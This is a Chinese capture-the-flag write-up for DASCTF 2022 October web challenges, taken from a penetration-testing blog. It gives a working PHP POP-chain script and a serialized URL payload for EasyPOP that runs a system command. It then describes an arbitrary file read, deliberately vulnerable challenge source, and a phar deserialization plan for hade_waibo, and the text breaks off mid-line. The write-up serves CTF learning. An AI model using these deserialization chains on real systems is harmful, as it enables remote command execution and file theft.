---
title: DASCTF2022 ——十月赛 Web 部分Writeup - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/16834678.html
source: 博客园 - 渗透测试中心
date: 2022-10-29
fetch_date: 2025-10-03T21:13:57.967089
---

# DASCTF2022 ——十月赛 Web 部分Writeup - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [DASCTF2022 ——十月赛 Web 部分Writeup](https://www.cnblogs.com/backlion/p/16834678.html "发布于 2022-10-28 09:02")

## EasyPOP

题目环境是 php 7.4, 图省事直接把所有属性的类型都改成 public

起点是 sorry 类的 `__destruct()`, 由 `echo $this->hint` 调用到 show 类的 `__toString()` 方法, 然后通过执行 `$this->ctf->show()` 跳转 secret\_code 类的 `__call()` , 进而到 `show()` 方法, 在 `show()` 方法中访问不存在的属性, 跳转到 sorry 类的 `__get()`, 最后通过 `$name()` 跳到 fine 类的 `__invoke()`

pop 链构造如下

```
<?php

class fine
{
    public $cmd;
    public $content;
}

class show
{
    public $ctf;
    public $time;
}

class sorry
{
    public $name;
    public $password;
    public $hint;
    public $key;
}

class secret_code
{
    public $code;
}

$e = new fine();
$e->cmd = 'system';
$e->content = 'cat /flag';

$d = new sorry();
$d->key = $e;

$c = new secret_code();
$c->code = $d;

$b = new Show();
$b->ctf = $c;

$a = new sorry();
$a->name = '123';
$a->password = '123';
$a->hint = $b;

echo serialize($a);
```

最后改一下数字绕过 `__wakeup`

```
http://f9eac3ed-9425-4fe7-a009-aad41f9db212.node4.buuoj.cn:81/?pop=O:5:"sorry":4:{s:4:"name";s:3:"123";s:8:"password";s:3:"123";s:4:"hint";O:4:"show":2:{s:3:"ctf";O:11:"secret_code":1:{s:4:"code";O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:4:"hint";N;s:3:"key";O:4:"fine":3:{s:3:"cmd";s:6:"system";s:7:"content";s:9:"cat /flag";}}}s:4:"time";N;}s:3:"key";N;}
```

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231752647.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221028090147790-988802321.png "https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231752647.png")

## hade\_waibo

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231753442.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221028090148791-687031589.png "https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231753442.png")

cancan need 有任意文件读取

```
http://745b93ee-b378-4803-b84e-52f9e7b78d2a.node4.buuoj.cn:81/file.php?m=show&filename=file.php
```

file.php

............

<?php

error\_reporting(0);

session\_start();

include 'class.php';

if($\_SESSION['isLogin'] !== true){

    die("<script>alert('号登一下谢谢。');location.href='index.php'</script>");

}

$form = '

<form action="file.php?m=upload" method="post" enctype="multipart/form-data" >

    <input type="file" name="file">

    <button class="mini ui button" ><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">

  提交

</font></font></button>

</form>';

$file = new file();

switch ($\_GET['m']) {

    case 'upload':

        if(empty($\_FILES)){die($form);}

        $type = end(explode(".", $\_FILES['file']['name']));

        if ($file->check($type)) {

            die($file->upload($type));

        }else{

            die('你食不食油饼');

        }

        break;

    case 'show':

        die($file->show($\_GET['filename']));

        break;

    case 'rm':

        $file->rmfile();

        die("全删干净了捏");

        break;

    case 'logout':

        session\_destroy();

        die("<script>alert('已退出登录');location.href='index.php'</script>");

        break;

    default:

        echo '<h2>Halo! '.$\_SESSION['username'].'</h2>';

        break;

}

?>

............

class.php

‘<?php

class User

{

    public $username;

    public function \_\_construct($username){

        $this->username = $username;

        $\_SESSION['isLogin'] = True;

        $\_SESSION['username'] = $username;

    }

    public function \_\_wakeup(){

        $cklen = strlen($\_SESSION["username"]);

        if ($cklen != 0 and $cklen <= 6) {

            $this->username = $\_SESSION["username"];

        }

    }

    public function \_\_destruct(){

        if ($this->username == '') {

            session\_destroy();

        }

    }

}

class File

{

    #更新黑名单为白名单，更加的安全

    public $white = array("jpg","png");

    public function show($filename){

        echo '<div class="ui action input"><input type="text" id="filename" placeholder="Search..."><button class="ui button" onclick="window.location.href=\'file.php?m=show&filename=\'+document.getElementById(\'filename\').value">Search</button></div><p>';

        if(empty($filename)){die();}

        return '<img src="data:image/png;base64,'.base64\_encode(file\_get\_contents($filename)).'" />';

    }

    public function upload($type){

        $filename = "dasctf".md5(time().$\_FILES["file"]["name"]).".$type";

        move\_uploaded\_file($\_FILES["file"]["tmp\_name"], "upload/" . $filename);

        return "Upload success! Path: upload/" . $filename;

    }

    public function rmfile(){

        system('rm -rf /var/www/html/upload/\*');

    }

    public function check($type){

        if (!in\_array($type,$this->white)){

            return false;

        }

        return true;

    }

}

#更新了一个恶意又有趣的Test类

class Test

{

    public $value;

    public function \_\_destruct(){

        chdir('./upload');

        $this->backdoor();

    }

    public function \_\_wakeup(){

        $this->value = "Don't make dream.Wake up plz!";

    }

    public function \_\_toString(){

        $file = substr($\_GET['file'],0,3);

        file\_put\_contents($file, "Hack by $file !");

        return 'Unreachable! :)';

    }

    public function backdoor(){

        if(preg\_match('/[A-Za-z0-9?$@]+/', $this->value)){

            $this->value = 'nono~';

        }

        system($this->value);

    }

}

Test 类可以利用, 第一时间想的是 phar 反序列化

可以用 `.` 执行命令来绕过正则

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231758660.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221028090149620-867049611.png "https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231758660.png")

思路就是先上传 phar 文件, 然后上传一个 jpg, 其内容包含要执行的命令

注意 jpg 的名称要在 phar 的前面, 例如 phar 的名称是 `dasctfe4.jpg`, 包含命令的 jpg 名称必须是 `dasctfc2.jpg` 或者 `dasctf01.jpg` (ascii 码较小)

不过试的时候发现绕过 wakeup 好像不太行…

然后想起来做 EasyLove 题的时候根目录下有个 start.sh 部署脚本, 结合题目的描述 `tips:flag在/目录下的一个文件里`, 索性直接读取 start.sh 看看

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231801987.png](https://img2022.cnblogs.com/blog/1049983/202210/...